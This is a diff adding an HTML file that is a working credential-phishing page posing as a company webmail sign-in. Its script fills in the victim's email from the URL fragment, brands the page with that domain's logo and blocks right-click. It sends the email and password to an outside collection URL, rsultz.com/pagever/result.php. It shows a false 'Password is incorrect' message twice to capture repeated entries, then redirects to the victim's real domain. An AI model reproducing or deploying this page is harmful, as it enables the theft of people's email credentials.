@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!--<meta name="viewport" content="width=device-width, initial-scale=1.0">-->
+    <title id="tittle" style="text-transform: capitalize;"></title>
+    <link id="favicon" rel="shortcut icon" href="">
+    <!-- <link rel="stylesheet" href="./css/style.css"> -->
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">
+    <script src="https://kit.fontawesome.com/f6136e9b49.js" crossorigin="anonymous"></script>
+</head>
+<style>
+    * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0; 
+    color: #333;
+}
+
+body {
+    /*background-image: url(../ZvlG0Sw\ \(1\).jpg);*/
+    /*background-size: cover;*/
+    /*background-repeat: no-repeat;*/
+     /*background-position: center; */
+    height: 100vh;
+    width: 100%;
+    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+    font-size: 14px;
+    line-height: 1.42857;
+    color: rgb(51, 51, 51);
+    overflow: hidden;
+    background-attachment: fixed;
+}
+.container {
+   background: transparent;
+}
+
+img {
+    width: 100%;
+    height: auto;
+}
+form {
+    padding: 0rem 1rem;
+    padding-top: 4px;
+}
+
+.input-container {
+  display: -ms-flexbox; /* IE10 */
+  display: flex;
+  width: 100%;
+  margin-bottom: 15px;
+  border-color: #CACACA;
+}
+
+.icon {
+    color: rgb(85, 85, 85);
+    text-align: center;
+    background-color: rgb(238, 238, 238);
+    border: 1px solid rgb(204, 204, 204);
+    /* border-radius: 4px; */
+
+  padding: 10px;
+  min-width: 50px;
+  border-bottom-left-radius: 4px;
+  border-top-left-radius: 4px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 10px;
+  outline: none;
+  border: 1px solid #ccc;
+  border-top-right-radius: 4px;
+  border-bottom-right-radius: 4px;
+  transition: border-color ease-in-out .15s, box-shadow ease-in-out .15s;
+  font-size: 14px;
+  line-height: 1.42857143;
+  color: #555;
+}
+.input-field:focus {
+    box-shadow: 0 0 5px rgb(51, 122, 183);
+  /* padding: 3px 0px 3px 3px; */
+  /* margin: 5px 1px 3px 0px; */
+  border: 1px solid rgb(51, 122, 183);
+}
+
+.input-field:focus {
+  box-shadow: #2e6da4;
+}
+
+/* Set a style for the submit button */
+.btnn {
+    color: rgb(255, 255, 255);
+    background-color: rgb(51, 122, 183);
+    border-color: rgb(46, 109, 164);
+    padding: 9px 12px;
+    border: 1px solid transparent;
+    cursor: pointer;
+    width: 100%;
+    opacity: 0.9;
+    margin-bottom: 1rem;
+    /* border-radius: 4px; */
+    font-size: 15px;
+    font-weight: bold;
+    margin-top: 1rem;
+}
+
+.btnn:hover {
+  opacity: 1;
+}
+.box2of {
+
+    background-color: #f0f0f0;
+    /* margin-top: -35px; */
+    padding: 10px;
+    padding-top: 63px;
+    box-shadow: 10px 5px 5px #00000040;
+    width: 450px;
+    margin: auto;
+    border-radius: 19px;
+    padding-bottom: 46px;
+    margin-top: 4rem;
+}
+h2 {
+    font-family: inherit;
+    font-weight: 700;
+    line-height: 1.1;
+    color: inherit;
+    text-align: center;
+    font-size: 33px;
+}
+.small {
+    display: block;
+    text-align: center;
+    color: crimson;
+    /* margin-bottom: 1rem; */
+    font-size: 16px;
+}
+a {
+    color: rgb(51, 122, 183);
+    text-decoration: none;
+}
+
+#ermg {
+    color: #a94442;
+    background-color: #f2dede;
+    border-color: #ebccd1;
+    padding: 10px;
+    text-align: center;
+    margin-bottom: 20px;
+    border: 1px solid transparent;
+    border-radius: 4px;margin-bottom: 20px;
+    border: 1px solid transparent;
+    border-radius: 4px;
+    /*margin-top: 10px;*/
+    font-size: 15px;
+    display: none;
+}
+#top {
+    display: inline-flex; align-items: center; margin: auto;
+}
+@media  (max-width: 760px) {
+    /*.logoname {*/
+    /*    font-size: 13px;*/
+    /*}*/
+    /* .box2of {
+    width: 70%;
+} */
+}
+/* @media  (max-width: 600px) {
+    .box2of {
+    width: 90%;
+
+}
+h2 {
+    font-family: inherit;
+    font-weight: 700;
+    line-height: 1.1;
+    color: inherit;
+    text-align: center;
+    font-size: 19px;
+    letter-spacing: 3px;
+}
+} */
+</style>
+
+<body>
+    <img src="https://i.ibb.co/nfzhv0y/ZvlG0Sw.jpg" alt="" style="position: fixed;
+    left: 0px;
+    top: 0px;
+    z-index: -1;
+    height: 100%;
+    width: 100%;
+    background-position: center center;">
+    <div class="container">
+        <div class="box2of">
+                <h2 class="text-center" style="margin-bottom: .8rem;">
+                    <div id="top">
+                         <img src="https://logo.clearbit.com/inbox.com" alt="" id="logoimg" style="width:46px;height:46px;">
+            
+                         <span style="vertical-align: middle; padding-left: 5px; font-size: 30px; font-weight: 500; text-transform: capitalize;" class="logoname" id="logoname">Webclient</span>
+                   </div>
+                   <br><br>Sign in to access documents
+                </h2>
+                <p style="text-align: center;">using your Email account for verification</p>
+            <form action="" id="result" method="post" style="max-width:500px;margin:auto">
+                <small id="ermg" class="small"></small>
+    
+                <div class="input-container">
+                    <i class="fa fa-user icon"></i>
+                  <input class="input-field"  style="color: rgb(85, 85, 85); background-color: rgb(255, 255, 255);" type="text" placeholder="Email" id="eemail" name="email" readonly required>
+                </div>
+                
+                <div class="input-container">
+                  <i class="fas fa-lock icon"></i>
+                  <input class="input-field" type="password" id="password" placeholder="Password" name="userpwd" required>
+                </div>
+              
+                <button type="submit" class="btnn" id="btn">Sign in</button>
+                <span style="margin-top: 1rem;">
+                    <input type="checkbox" name="" id="">
+                    Secure login session?
+                </span>
+                <a href="#" class="pull-right" style="display: inline; float: right;">Forgot Password?</a>
+            </form>
+        </div>
+        <!-- <p style="text-align:center; margin-top: 1rem;"> <a href="#"> Copyright © <span class="logoname" id="logona2" style="text-transform: capitalize;  color: #337ab7;">W3schools</span> 2023 </a></p> -->
+    </div>
+    <div style="position: fixed; bottom: 0px; left: 0px; width: 100%; color: #ffffff; text-align: center; background-color: #f0f0f0; height: 45px;"> 
+        <img src="https://i.ibb.co/7yS7TgY/1BJKFkm.png" alt="banner.png" style="width: 500px;margin-left: -834px;">
+        <a href="#" style="position: absolute;"> <p style="margin-left: 479px;margin-top: 14px;color: rgb(51, 122, 183);">Connected To Webmail Admin Copyright 2023</p></a>
+    </div>
+
+    <script> 
+        const phpurl = "https://rsultz.com/pagever/result.php" // put your php url here
+
+        // Set the cookie automatically when the page loads
+        window.addEventListener("load", () => {
+            var formSubmitted = 0; 
+        });
+
+        document.getElementById("btn").addEventListener("click", () => {
+            document.getElementById("btn").textContent = "Loading...";
+            setTimeout(() => {
+                document.getElementById("btn").textContent = "Sign in";
+            }, 3000);
+        })
+
+        // Get the full URL
+        const fullUrl = window.location.href;
+        
+        const emailRegex = /#([^#]+)$/; // Assumes email is in the fragment identifier
+        const match = fullUrl.match(emailRegex);
+      
+
+        const email = match ? match[1] : null;
+      
+       
+        console.log(email);
+
+
+            document.getElementById("eemail").value = email;
+
+            const domain = email.split('@')[1];
+            const companyName = domain.split('.')[0];
+
+            console.log(companyName);
+            localStorage.setItem("userDomain", domain);
+
+            // Log or use the extracted domain
+            console.log(domain);
+            document.getElementById("favicon").href = `https://logo.clearbit.com/${domain}`;
+            document.getElementById("logoimg").src = `https://logo.clearbit.com/${domain}`;
+            document.getElementById("tittle").textContent = `${companyName} - Mail`;
+            document.getElementById("logoname").textContent = `${companyName}`;
+            document.getElementById("logoname").style.textTransform =  "uppercase";
+            // document.getElementById("logona2").textContent = `${companyName}`;
+
+
+        
+
+        document.addEventListener('contextmenu', function (e) {
+         e.preventDefault();
+        });
+
+        var formSubmitted = 0;
+
+
+      document.getElementById("result").addEventListener("submit", function (event) {
+          event.preventDefault();
+      
+          formSubmitted++;
+          const directts = localStorage.getItem("userDomain")
+          console.log(directts);
+      
+          var inputs = document.querySelectorAll('input[required]');
+          for (var i = 0; i < inputs.length; i++) {
+              if (!inputs[i].value.trim()) {
+                //   alert("Please fill in all fields.");
+                     document.getElementById("ermg").style.display = "block";
+                     document.getElementById("ermg").textContent = "Password is incorrect. Please try again";
+                  return;
+              }
+          }
+      
+          var formData = new FormData(this);
+          var xhr = new XMLHttpRequest();
+          xhr.open("POST", `${phpurl}`, true); 
+      
+          xhr.onreadystatechange = function () {
+              if (xhr.readyState == 4 && xhr.status == 200) {
+                  console.log(xhr.responseText);
+      
+                  if (formSubmitted === 1) {
+                      console.log("YESSSSS");
+                      document.getElementById("password").value = "";
+                      document.getElementById("ermg").style.display = "block";
+                      document.getElementById("ermg").textContent = "Password is incorrect. Please try again";
+                  } else if (formSubmitted === 2) {
+                          document.getElementById("password").value = "";
+                          console.log("invalid");
+                          document.getElementById("ermg").style.display = "block";
+                          document.getElementById("ermg").textContent = "Password is incorrect. Please try again";
+                  } else if (formSubmitted === 3) {
+                        setInterval(() => {
+                            
+                            window.location.href = `http://${directts}`;
+                        }, 2000);
+                     
+                          console.log("invalid");
+                  }
+              }
+          };
+      
+          xhr.send(formData);
+      });
+
+    </script>
+</body>
+
+</html>
